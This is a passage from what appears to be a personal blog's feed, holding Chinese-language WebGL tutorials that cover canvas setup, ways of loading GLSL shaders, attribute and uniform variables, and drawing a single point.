source)函数向着色器指定GLSL源代码，也就是上一章一直强调的要传入的字符串形式的GLSL代码。</p><ol start="3"><li>编译着色器</li></ol><p>通过gl.compileShader(shader)来编译着色器代码。GLSL代码在使用之前要编译成二进制的可执行格式，WebGL系统真正使用的是这种可执行格式。如果通过gl.shaderSource替换了一个着色器内的代码，需要再次进行编译。</p><p>通过gl.getShaderParameter(shader, pname)函数，将第二个参数指定为gl.COMPILE_STATUS，可以检查着色器编译成功与否。若编译失败，返回false。可再通过gl.getShaderInfoLog(shader)函数来获取编译错误的具体信息。</p><ol start="4"><li>创建程序对象</li></ol><p>通过gl.createProgram()来创建一个程序对象。可以通过gl.deleteProgram(program)来删除创建的程序对象。</p><ol start="5"><li>为程序对象分配着色器</li></ol><p>通过gl.attachShader(program, shader)来为程序对象分配着色器。为了WebGL系统的正常运行，顶点着色器和片元着色器都应该被分配给程序对象。通过gl.detachShader(program, shader)函数来解除分配给程序对象的着色器。</p><ol start="6"><li>连接程序对象</li></ol><p>通过gl.linkProgram()函数将程序对象中的顶点着色器和片元着色器连接起来。类似地，通过gl.getProgramParameter(shader, pname)设定第二个参数为gl.LINK_STATUS和gl.getProgramInfoLog(program)函数来获取编译成功与否和编译错误的信息。</p><ol start="7"><li>使用程序对象</li></ol><p>通过gl.useProgram(program)函数来指定WebGL系统使用的程序对象。</p><p>通过在绘制前准备多个程序对象，在绘制时根据需要切换使用的程序对象，就能达到使用多个着色器的效果。这也是为什么上一章我要把这一步从initShaders()里分离出来的原因。</p><p> </p><h3 id="从js代码向着色器传递数据"><a class="markdownIt-Anchor" href="#从js代码向着色器传递数据"></a> 从JS代码向着色器传递数据</h3><hr><p>上一章虽然定义了着色器，但相关变量都是直接在着色器内定义的，缺乏可扩展性。如果要引入模型，数据势必要在JS代码与着色器代码间进行交互。</p><p> </p><h4 id="三种shader变量"><a class="markdownIt-Anchor" href="#三种shader变量"></a> 三种shader变量</h4><p>如何将信息从JS代码传到GLSL代码？这将涉及GLSL的三种变量(实际上是存储限定符)——attribute, uniform以及varying。</p><p>attribute变量是只能在vertex shader中使用的变量，不能在fragment shader中声明和使用。一般attribute变量用来表示一些顶点的数据，如：顶点坐标，法线，纹理坐标，顶点颜色等。</p><p>uniform变量是外部程序传递给shader的变量，在shader内部，uniform变量不能被shader程序修改。如果uniform变量在vertex和fragment两者间声明一致，则它可以被vertex和fragment共享使用。uniform变量一般用来表示：变换矩阵，材质，光照参数和颜色等信息。</p><p>varying变量是vertex和fragment shader间作数据传递用的。一般vertex shader修改varying变量的值，然后fragment shader使用该varying变量的值。因此varying变量在vertex和fragment shader两者之间的声明必须是一致的。</p><p> </p><h4 id="获取来自js的数据"><a class="markdownIt-Anchor" href="#获取来自js的数据"></a> 获取来自JS的数据</h4><p>来看两段简单的GLSL代码：</p><pre class="highlight"><code class="glsl"><span class="hljs-comment">//vertex shader</span><span class="hljs-keyword">attribute</span> <span class="hljs-type">vec4</span> a_Position;<span class="hljs-type">void</span> main(){    <span class="hljs-built_in">gl_Position</span> = a_Position;    <span class="hljs-built_in">gl_PointSize</span> = <span class="hljs-number">10.0</span>;}<span class="hljs-comment">//fragment shader</span><span class="hljs-keyword">precision</span> <span class="hljs-keyword">mediump</span> <span class="hljs-type">float</span>;<span class="hljs-keyword">uniform</span> <span class="hljs-type">vec4</span> u_FragColor;<span class="hljs-type">void</span> main(){    <span class="hljs-built_in">gl_FragColor</span> = u_FragColor;}</code></pre><p>这是写在两个着色器的代码。</p><p>要向a_Position和u_FragColor传送数据，首先要获取这两个变量在WebGL系统中的位置，然后再通过函数发送数据。写在JS中的代码：</p><pre class="highlight"><code class="js"><span class="hljs-comment">//获取存储位置</span><span class="hljs-keyword">var</span> a_Position = gl.getAttribLocation(gl.program, <span class="hljs-string">'a_Position'</span>);<span class="hljs-keyword">var</span> u_FragColor = gl.getUniformLocation(gl.program, <span class="hljs-string">'u_FragColor'</span>);<span class="hljs-comment">//传送数据</span>gl.vertexAttrib3f(a_Position, xy[<span class="hljs-number">0</span>], xy[<span class="hljs-number">1</span>], xy[<span class="hljs-number">2</span>]);gl.uniform4f(u_FragColor, rgba[<span class="hljs-number">0</span>], rgba[<span class="hljs-number">1</span>], rgba[<span class="hljs-number">2</span>], rgba[<span class="hljs-number">3</span>]);</code></pre><p>attribute赋值同族函数：gl.vertexAttrib1f, gl.vertexAttrib2f, gl.vertexAttrib3f, gl.vertexAttrib4f</p><p>uniform赋值同族函数：gl.uniform1f, gl.uniform2f, gl.uniform3f, gl.uniform4f</p><p>数字表示传递的参数的个数。</p><p>赋值后调用drawArrays()函数，即可动态改变顶点状态后进行绘制。</p><p> </p><p>这章不提供代码。</p><p> </p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3><hr><p>[1] 《WebGL Programming Guide》Kouichi Matsuda, Rodger Lea<br>[2] <a href="https://blog.csdn.net/Jackers679/article/details/6848085" target="_blank" rel="noopener">OpenGL ES2.0 的三种变量类型</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孤独的WebGL之旅(一) | Hello, WebGL.</title>
      <link href="/2020/01/20/webgl(1)/"/>
      <url>/2020/01/20/webgl(1)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这悲哀的山巅，请用你的眼泪诅咒我、祝福我，不要温和地走入那个良夜。</p></blockquote><a id="more"></a><p>作为与<a href="https://github.com/AshenAshes/WebGL-MidSummer_Night" target="_blank" rel="noopener">项目</a>一致的记录而存在。</p><p>是对曾经没有时间完善的WebGL项目的追溯，也是一个重新学习原生WebGL的过程。</p><p>  </p><h3 id="创建与设置画布"><a class="markdownIt-Anchor" href="#创建与设置画布"></a> 创建与设置画布</h3><hr><p>我们用H5新引入的<code>&lt;canvas&gt;</code>标签作为绘图区域，它允许JavaScript动态绘制图形。由于canvas是透明的，在canvas间加入的信息只会在不支持WebGL的浏览器上显示，这可以作为错误提示。</p><p>对canvas内容的操作与绘制将通过JavaScript代码来实现，我们可以用<code>&lt;script&gt;&lt;/script&gt;</code>标签引入对应的JS代码。</p><p>用body标签指定JS程序的入口。</p><pre class="highlight"><code class="html"><span class="hljs-comment">&lt;!-- index.html --&gt;</span><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WebGL<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./lib/jquery-3.3.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./css/style.css"</span>&gt;</span>    <span class="hljs-comment">&lt;!-- &lt;script type="text/javascript" src="./js/windowResize.js"&gt;&lt;/script&gt; --&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"main()"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span>&gt;</span>      Please use a browser that supports "canvas"    <span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./js/draw.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p> </p><p>我们预想的canvas应该自适应撑满整个屏幕，曾经在写类似前端需求时碰到过一个问题，就是会有高度上的滚动条出现，为了解决这个问题，抄了一些网上的css，使canvas的宽度和高度都可以适应全屏幕。对了，为了代码的可阅读性，html文件在根目录，其他所有的css,js,之后的着色器、model等都将独立设置子目录。</p><p>css代码如下：</p><pre class="highlight"><code class="css"><span class="hljs-comment">/* style.css */</span><span class="hljs-selector-tag">html</span>,<span class="hljs-selector-tag">body</span>,<span class="hljs-selector-tag">canvas</span> {  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;  <span class="hljs-attribute">font-family</span>: Monospace;  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#000</span>;  <span class="hljs-attribute">color</span>: <span class="hljs-number">#000</span>;  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0px</span>;  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0px</span>;  <span class="hljs-attribute">overflow</span>: hidden;}* {  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;}<span class="hljs-selector-tag">canvas</span> {  <span class="hljs-attribute">display</span>: block;}</code></pre><p> </p><p>加入这段代码后，你会发现body所在的区域全都变成黑色了，并且没有滚动条出现。但当用F12开发者工具观察时，你会发现canvas所在区域的高度并没有占满整个屏幕。这时候我们需要用到JQuery来动态设置canvas的高度。注意，使用JQuery要引入JQuery文件，我把它放在了/lib文件夹里。</p><p>你可以选择监听窗口的大小变化然后实时刷新canvas的size，注意每次刷新后都会丢失canvas的内容，需要重新绘制。注释掉的windowResize.js即为动态刷新的代码，如下所示：</p><pre class="highlight"><code class="javascript"><span class="hljs-comment">//windowResize.js</span>$(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{  $(<span class="hljs-built_in">window</span>).resize(resizeCanvas);  resizeCanvas();});<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resizeCanvas</span>(<span class="hljs-params"></span>)</span>{  $(<span class="hljs-string">"canvas"</span>).attr(<span class="hljs-string">"width"</span>, $(<span class="hljs-built_in">window</span>).get(<span class="hljs-number">0</span>).innerWidth);  $(<span class="hljs-string">"canvas"</span>).attr(<span class="hljs-string">"height"</span>, $(<span class="hljs-built_in">window</span>).get(<span class="hljs-number">0</span>).innerHeight);};</code></pre><p> </p><p>不过我暂时没有想好把canvas和window一起重绘的代码放在哪里，所以这里我采用了只在window初始化的时候确定canvas的size，所以这段代码被放在了main的初始化阶段。和绘制的代码放在一起，便于我观察测试：</p><pre class="highlight"><code class="javascript"><span class="hljs-comment">//draw.js</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>{  <span class="hljs-keyword">var</span> canvas = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'canvas'</span>);  <span class="hljs-keyword">if</span>(!canvas){    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'Failed to get the &lt;canvas&gt; element'</span>);    <span class="hljs-keyword">return</span> ;  }  <span class="hljs-comment">//自适应一开始的页面大小</span>  $(<span class="hljs-string">"canvas"</span>).attr(<span class="hljs-string">"width"</span>, $(<span class="hljs-built_in">window</span>).get(<span class="hljs-number">0</span>).innerWidth);  $(<span class="hljs-string">"canvas"</span>).attr(<span class="hljs-string">"height"</span>, $(<span class="hljs-built_in">window</span>).get(<span class="hljs-number">0</span>).innerHeight);  <span class="hljs-keyword">var</span> context = canvas.getContext(<span class="hljs-string">'2d'</span>);  context.fillStyle = <span class="hljs-string">'rgba(0, 0, 255, 1.0)'</span>;  context.fillRect(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">100</span>);}</code></pre><p> </p><h3 id="尝试绘制"><a class="markdownIt-Anchor" href="#尝试绘制"></a> 尝试绘制</h3><hr><p>绘制主要通过js进行，代码已经在上面的draw.js里了。我们首先通过id获取canvas对象，但绘制并不是直接通过canvas对象进行的，而是由canvas提供的上下文对象(context)来进行的。getContext参数指定了绘制对象的类型是2d还是3d，这里我们测试画的是一个矩形，所以是2d对象。</p><p>fillStyle可以理解为画笔颜色，这里用的是Alpha=1.0的蓝色。RGB的范围都是0-255，alpha的范围是0-1.0。</p><p>关于WebGL的坐标系统，原点在屏幕左上角，x轴从左到右，y轴从上到下。fillRect方法前两个参数是矩形的左上角坐标，后两个参数对应矩形的x轴方向长度和y轴方向长度(即宽度和高度)。</p><p>绘制效果如下图所示：</p><p><img src="/article/webgl(1)/1.png" alt="aa"></p><p>这只是一个尝试在canvas上绘制图形的过程，真正的WebGL编程远比这个繁琐。</p><h3 id="着色器相关"><a class="markdownIt-Anchor" href="#着色器相关"></a> 着色器相关</h3><hr><h4 id="函数库"><a class="markdownIt-Anchor" href="#函数库"></a> 函数库</h4><p>注意，从这里开始我们将引入参考资料里的一些程序，这些程序大都是一些事先定义好的函数库，方便我们获取一些对象，隐去不同浏览器之间的差异，但是我们的主要编程部分仍然是遵循原生WebGL的主旨。</p><p>同时，为了避免以后不同函数库之间命名冲突的问题(曾经给我的CG大程造成了很大的麻烦)，我将建立自己的函数库，大致考虑分为两个，一个是WebGL-utils.js，注重于WebGL方面的初始化过程，另一个是math-utils.js，注重矩阵计算方面。有一个叫WebGL-debug.js的东西是用来显示debug信息的，这个是从参考资料代码里照搬的。</p><p> </p><h4 id="着色器"><a class="markdownIt-Anchor" href="#着色器"></a> 着色器</h4><p>着色器是WebGL最重要的概念之一，绘图过程必须用到着色器。WebGL需要两种着色器——顶点着色器(Vertex Shader)和片元着色器(Fragment Shader)，用GLSL语言编写。</p><p>顶点着色器是用来描述顶点特性(如位置、颜色等)的程序。片元着色器进行逐片元处理过程(如光照)。绘图的过程是，浏览器执行JS程序——JS执行WebGL相关方法——顶点着色器逐顶点操作，片元着色器逐片元操作——渲染到颜色缓冲区——显示在浏览器上。</p><p><img src="/article/webgl(1)/2.png" alt></p><p>不过虽然着色器代码是用GLSL语言编写的，创建着色器对象的过程中，程序接收的必须是字符串类型的对象，下面将介绍三种在JS代码中插入GLSL代码并创建着色器的方式。</p><p> </p><h4 id="用字符串存储着色器"><a class="markdownIt-Anchor" href="#用字符串存储着色器"></a> 用字符串存储着色器</h4><p>在参考资料书中，用到的都是这一种。直接在js代码内用字符串变量存储GLSL代码。</p><pre class="highlight"><code class="javascript"><span class="hljs-comment">// Vertex shader program</span><span class="hljs-keyword">var</span> VSHADER_SOURCE =   <span class="hljs-string">'void main() {\n'</span> +  <span class="hljs-string">'  gl_Position = vec4(0.0, 0.0, 0.0, 1.0);\n'</span> + <span class="hljs-comment">// Set the vertex coordinates of the point</span>  <span class="hljs-string">'  gl_PointSize = 10.0;\n'</span> +                    <span class="hljs-comment">// Set the point size</span>  <span class="hljs-string">'}\n'</span>;<span class="hljs-comment">// Fragment shader program</span><span class="hljs-keyword">var</span> FSHADER_SOURCE =  <span class="hljs-string">'void main() {\n'</span> +  <span class="hljs-string">'  gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);\n'</span> + <span class="hljs-comment">// Set the point color</span>  <span class="hljs-string">'}\n'</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{  ...  <span class="hljs-comment">// Initialize shaders</span>  <span class="hljs-keyword">if</span> (!initShaders(gl, VSHADER_SOURCE, FSHADER_SOURCE)) {    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'Failed to intialize shaders.'</span>);    <span class="hljs-keyword">return</span>;  }  ...}</code></pre><p>initShader()函数是函数库WebGL-utils.js中的一个函数，如果你对WebGL如何创建着色器的过程不感兴趣，你可以直接调用这个函数，忽略内部细节。注意第二第三个参数必须为字符串。</p><p>使用’\n’而不是直接用长字符串的原因是，这样做，当着色器内部出错时，就能获取出错的行号，对检查源代码错误很有帮助。</p><p>这种方法只适用于简单程序，书写很麻烦，创建和维护难度大。</p><p> </p><h4 id="内嵌于html代码中"><a class="markdownIt-Anchor" href="#内嵌于html代码中"></a> 内嵌于html代码中</h4><p>这种方法在网上的各种教程中很常见，通过设置<code>&lt;script&gt;</code>标签的type使得浏览器将内容视为数据块，不作为JS代码执行。</p><pre class="highlight"><code class="html">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"vertex-shader"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"x-shader/x-vertex"</span>&gt;</span><span class="actionscript">      <span class="hljs-keyword">void</span> main(){        gl_Position = vec4(<span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>); <span class="hljs-comment">//设置坐标</span>        gl_PointSize = <span class="hljs-number">10.0</span>;  <span class="hljs-comment">//设置尺寸</span>      }    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"fragment-shader"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"x-shader/x-fragment"</span>&gt;</span><span class="actionscript">      <span class="hljs-keyword">void</span> main(){        gl_FragColor = vec4(<span class="hljs-number">1.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>);  <span class="hljs-comment">//设置颜色</span>      }    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>在JS代码中还要将标签内容转为字符串，具体代码可以参考以下(这里的代码其实包含了创建着色器的内部细节，如果不想关心，可以将initShaders函数放到函数库里，传给函数的第二三个参数是着色器代码所在script标签的id)：</p><pre class="highlight"><code class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>{    ...    program = initShaders(gl, <span class="hljs-string">"vertex-shader"</span>, <span class="hljs-string">"fragment-shader"</span>);    gl.useProgram(program); <span class="hljs-comment">// 启用该shader程序对象 </span>    ...}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initShaders</span>(<span class="hljs-params"> gl, vertexShaderId, fragmentShaderId </span>)</span>{    <span class="hljs-keyword">var</span> vertShdr;    <span class="hljs-keyword">var</span> fragShdr;    <span class="hljs-keyword">var</span> vertElem = <span class="hljs-built_in">document</span>.getElementById( vertexShaderId );    <span class="hljs-keyword">if</span> ( !vertElem ) {         alert( <span class="hljs-string">"Unable to load vertex shader "</span> + vertexShaderId );        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-keyword">else</span> {        vertShdr = gl.createShader( gl.VERTEX_SHADER );        gl.shaderSource( vertShdr, vertElem.text );        gl.compileShader( vertShdr );        <span class="hljs-keyword">if</span> ( !gl.getShaderParameter(vertShdr, gl.COMPILE_STATUS) ) {            <span class="hljs-keyword">var</span> msg = <span class="hljs-string">"Vertex shader failed to compile.  The error log is:"</span>          + <span class="hljs-string">"&lt;pre&gt;"</span> + gl.getShaderInfoLog( vertShdr ) + <span class="hljs-string">"&lt;/pre&gt;"</span>;            alert( msg );            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;        }    }    <span class="hljs-keyword">var</span> fragElem = <span class="hljs-built_in">document</span>.getElementById( fragmentShaderId );    <span class="hljs-keyword">if</span> ( !fragElem ) {         alert( <span class="hljs-string">"Unable to load vertex shader "</span> + fragmentShaderId );        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-keyword">else</span> {        fragShdr = gl.createShader( gl.FRAGMENT_SHADER );        gl.shaderSource( fragShdr, fragElem.text );        gl.compileShader( fragShdr );        <span class="hljs-keyword">if</span> ( !gl.getShaderParameter(fragShdr, gl.COMPILE_STATUS) ) {            <span class="hljs-keyword">var</span> msg = <span class="hljs-string">"Fragment shader failed to compile.  The error log is:"</span>          + <span class="hljs-string">"&lt;pre&gt;"</span> + gl.getShaderInfoLog( fragShdr ) + <span class="hljs-string">"&lt;/pre&gt;"</span>;            alert( msg );            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;        }    }    <span class="hljs-keyword">var</span> program = gl.createProgram();    gl.attachShader( program, vertShdr );    gl.attachShader( program, fragShdr );    gl.linkProgram( program );        <span class="hljs-keyword">if</span> ( !gl.getProgramParameter(program, gl.LINK_STATUS) ) {        <span class="hljs-keyword">var</span> msg = <span class="hljs-string">"Shader program failed to link.  The error log is:"</span>            + <span class="hljs-string">"&lt;pre&gt;"</span> + gl.getProgramInfoLog( program ) + <span class="hljs-string">"&lt;/pre&gt;"</span>;        alert( msg );        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    <span class="hljs-keyword">return</span> program;}</code></pre><p>但我觉得把GLSL代码放在html里还是不好管理，html代码的可读性变差了，还是放在文件里容易维护，于是就有了第三个方法。</p><p> </p><h4 id="从文件加载着色器"><a class="markdownIt-Anchor" href="#从文件加载着色器"></a> 从文件加载着色器</h4><p>从文件加载着色器需要创建一个XMLHttpRequest对象request来加载指定文件，事实上后面我们加载model时也要用到类似方法。可以将加载着色器的过程视作一个资源加载的过程，甚至我是在获取canvas对象之前加载的，因为加载过程和绘图无关。</p><p>fileName指定了文件加载的路径，记得采用相对路径。onLoadShaderFile是注册的事件响应函数，它将在文件加载完成时被调用。加载的着色器代码被作为字符串对象存储，当两者都加载完成时，回到main()函数进行下一步操作。</p><p>关键代码如下：</p><pre class="highlight"><code class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadShaderFile</span>(<span class="hljs-params">fileName, shader</span>)</span>{  <span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();  request.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">if</span>(request.readyState === <span class="hljs-number">4</span> &amp;&amp; request.status !== <span class="hljs-number">404</span>){      onLoadShaderFile(request.responseText, shader);    }  }  request.open(<span class="hljs-string">'GET'</span>, fileName, <span class="hljs-literal">true</span>);  request.send();}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onLoadShaderFile</span>(<span class="hljs-params">fileString, type</span>)</span>{  <span class="hljs-keyword">if</span>(type == <span class="hljs-string">'VERTEX_SHADER'</span>){    VERTEX_SHADER = fileString;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"vertex shader:"</span> + VERTEX_SHADER);  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(type == <span class="hljs-string">'FRAGMENT_SHADER'</span>){    FRAGMENT_SHADER = fileString;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"vertex shader:"</span> + FRAGMENT_SHADER);  }   <span class="hljs-keyword">if</span>(VERTEX_SHADER &amp;&amp; FRAGMENT_SHADER){    FLAG_SHADER_LOADED = <span class="hljs-literal">true</span>;    main();  }}</code></pre><p>从文件加载意味着我们可以比较方便地管理多个着色器对象，这对WebGL高级编程或许有意义(我还没学到hhh)。</p><p> <br>至此,我们了解了三种加载着色器的方式，但对着色器内部代码的意义，以及如何使用着色器进行绘制还没有涉及。下面将通过一个简单的程序来说明。</p><p> </p><h3 id="简单的webgl程序"><a class="markdownIt-Anchor" href="#简单的webgl程序"></a> 简单的WebGL程序</h3><hr><p>下面我们将绘制一个最简单的图形——一个位于原点的10个像素大的红色的点。实际效果中将为一个矩形，因为对WebGL来说绘制矩形比绘制圆更快。</p><p> </p><h4 id="顶点着色器"><a class="markdownIt-Anchor" href="#顶点着色器"></a> 顶点着色器</h4><p>顶点着色器定义了点的相关性质，在这里我们定义了点的位置和大小：</p><pre class="highlight"><code class="glsl"><span class="hljs-type">void</span> main(){  <span class="hljs-built_in">gl_Position</span> = <span class="hljs-type">vec4</span>(<span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>); <span class="hljs-comment">//设置坐标</span>  <span class="hljs-built_in">gl_PointSize</span> = <span class="hljs-number">10.0</span>;  <span class="hljs-comment">//设置尺寸</span>}</code></pre><p>gl_Position和gl_PointSize是顶点着色器内置的变量，你必须传值给这两个变量。不同于JS，GLSL是一种强类型的语言，gl_Position的类型是vec4，相当于长度为4的矢量，每个值的类型都是float。它表示顶点的齐次坐标。gl_PointSize的类型也是float，所以这里的10.0不能写成10。vec4是GLSL内置的构造函数，在JS里，通过math-utils.js的函数库，我们也创建了类似的一连串的vec2,vec3,vec4的构造函数。</p><p> </p><h4 id="webgl坐标系"><a class="markdownIt-Anchor" href="#webgl坐标系"></a> WebGL坐标系</h4><p>与canvas坐标系不同，WebGL坐标系的原点在canvas正中间，且是一个三维坐标系，具有x轴(从左往右)，y轴(从下往上)，z轴(从屏幕里往屏幕外)。x,y的坐标范围均为-1.0-1.0。在涉及深度之前，暂不讨论z轴，只把它定为0.0。</p><p> </p><h4 id="片元着色器"><a class="markdownIt-Anchor" href="#片元着色器"></a> 片元着色器</h4><p>片元着色器里，我们定义了该点的颜色：</p><pre class="highlight"><code class="glsl"><span class="hljs-type">void</span> main(){  <span class="hljs-built_in">gl_FragColor</span> = <span class="hljs-type">vec4</span>(<span class="hljs-number">1.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>);  <span class="hljs-comment">//设置颜色</span>}</code></pre><p>类似于顶点着色器，片元着色器的内置变量是gl_FragColor。这个四维向量代表RGBA值，范围不同于之前用过的，WebGL遵循了Opengl颜色分量的取值范围，所以四个参数范围在这里都是0.0-1.0。</p><p> </p><h4 id="清空绘图区"><a class="markdownIt-Anchor" href="#清空绘图区"></a> 清空绘图区</h4><p>进行绘制前，我们首先要清空一次颜色缓冲区。首先指定清空缓冲区的背景颜色，然后清空缓冲区。</p><pre class="highlight"><code class="javascript">    <span class="hljs-comment">//指定清空颜色缓冲区的颜色</span>    gl.clearColor(<span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>);    <span class="hljs-comment">//清空颜色缓冲区</span>    gl.clear(gl.COLOR_BUFFER_BIT);</code></pre><p>一旦指定了背景色，背景色就会驻存在WebGL系统中，在下一次调用gl.clearColor()方法前不会改变。</p><p> </p><h4 id="画一个点"><a class="markdownIt-Anchor" href="#画一个点"></a> 画一个点</h4><p>使用gl.drawArrays(mode, first, count)函数进行绘制。</p><pre class="highlight"><code class="javascript">    <span class="hljs-comment">//绘制一个点</span>    gl.drawArrays(gl.POINTS, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);</code></pre><p>顶点着色器会被执行count次，随后每个顶点调用一次片元着色器。</p><p>怎么用看这个:</p><p><img src="/article/webgl(1)/3.png" alt></p><p>至此，就完成了一个点的绘制。效果如下(恶趣味的红配绿)：</p><p><img src="/article/webgl(1)/4.png" alt></p><p>本文的代码放在<a href="https://github.com/AshenAshes/WebGL-MidSummer_Night/tree/WebGL1" target="_blank" rel="noopener">github</a>。</p><p>考虑到后续可能的一些骚操作，对initShaders()进行了一些改写，把绑定program提出来了。</p><p> </p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3><hr><p>[1] 《WebGL Programming Guide》Kouichi Matsuda, Rodger Lea</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neverland</title>
      <link href="/1999/08/28/Neverland/"/>
      <url>/1999/08/28/Neverland/</url>
      
